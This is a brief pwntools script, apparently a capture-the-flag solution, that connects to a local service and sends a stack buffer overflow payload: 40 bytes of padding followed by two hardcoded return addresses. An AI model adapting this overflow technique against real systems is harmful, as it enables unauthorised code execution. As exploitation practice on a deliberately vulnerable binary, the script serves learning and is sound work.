from pwn import *

p = remote('127.0.0.1', 31337)
# p = process('./very_baby')
p.recvuntil('...')
p.interactive()
p.sendline(b'A'*40+p64(0x0000000000401239)+p64(0x00000000004011b7))
p.interactive()
